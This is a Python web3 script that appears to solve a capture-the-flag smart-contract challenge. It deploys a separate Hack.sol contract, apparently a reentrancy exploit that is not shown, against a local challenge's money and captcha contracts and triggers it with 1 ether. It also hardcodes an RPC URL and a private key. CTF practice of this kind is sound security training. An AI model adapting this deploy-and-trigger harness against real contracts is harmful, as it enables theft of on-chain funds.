from web3 import Web3
from web3 import HTTPProvider
import solcx
import os

"""
https://github.com/foundry-rs/foundry

- Init new Project: forge init
- testing: forge test -vvv

Referensi: https://hackernoon.com/hack-solidity-reentrancy-attack
"""

RPC_URL = "http://localhost:50450/db8d6c65-ea56-45a8-b6fe-e1497a77920d"
PRIVKEY = "0xd7593e4271ac5380271496fd9e839fc9dd176c220a599ef71631a715ac9f7f16"
SETUP_CONTRACT_ADDR = "0x99d791b344A69031eF4605e786660600460512b6"

class Account:
    def __init__(self) -> None:
        self.w3 = Web3(HTTPProvider(RPC_URL))
        self.w3.eth.default_account = self.w3.eth.account.from_key(PRIVKEY).address
        self.account_address = self.w3.eth.default_account

    def get_balance(s, addr):
        print("balance:",s.w3.eth.get_balance(addr))


class BaseContractProps:
    def __init__(self, path: str) -> None:
        file, klass = path.split(':')
        self.__file = os.path.abspath(file)
        self.path = f"{self.__file}:{klass}"
    @property
    def abi(self):
        klass = solcx.compile_files(self.__file, output_values=["abi"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]['abi']
        raise Exception("class not found")

    @property
    def bin(self):
        klass = solcx.compile_files(self.__file, output_values=["bin"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]['bin']
        raise Exception("class not found")

class BaseDeployedContract(Account, BaseContractProps):
    def __init__(self, addr, file, abi=None) -> None:
        BaseContractProps.__init__(self, file)
        Account.__init__(self)
        self.address = addr
        if abi:
            self.contract = self.w3.eth.contract(addr, abi=abi)
        else:
            self.contract = self.w3.eth.contract(addr, abi=self.abi)

class BaseUndeployedContract(Account, BaseContractProps):
    def __init__(self, path) -> None:
        BaseContractProps.__init__(self,path)
        Account.__init__(self)
        self.contract = self.w3.eth.contract(abi=self.abi, bytecode=self.bin)

    def deploy_constructor(self, *args):
        tx_hash = self.contract.constructor(*args).transact()
        tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
        return  BaseDeployedContract(tx_receipt.contractAddress, self.path)

class SetupContract(BaseDeployedContract):
    def __init__(self) -> None:
        super().__init__(
            addr=SETUP_CONTRACT_ADDR,
            file="../contracts/Setup.sol:Setup",
        )

    @property
    def moneyContract(self):
        return self.contract.functions.moneyContract().call()

    @property
    def captchaContract(self):
        return self.contract.functions.captchaContract().call()

    def is_solved(s):
        result = s.contract.functions.isSolved().call()
        print("is solved:", result)

class HackContract(BaseUndeployedContract):
    def __init__(self) -> None:
        super().__init__("./Hack.sol:Hack")

if __name__ == "__main__":
    setup = SetupContract()
    hack = HackContract()
    hack_deployed = hack.deploy_constructor(setup.moneyContract, setup.captchaContract)
    hack_deployed.contract.functions.hack().transact({"value":Web3.to_wei(1, "ether")})
    setup.is_solved()
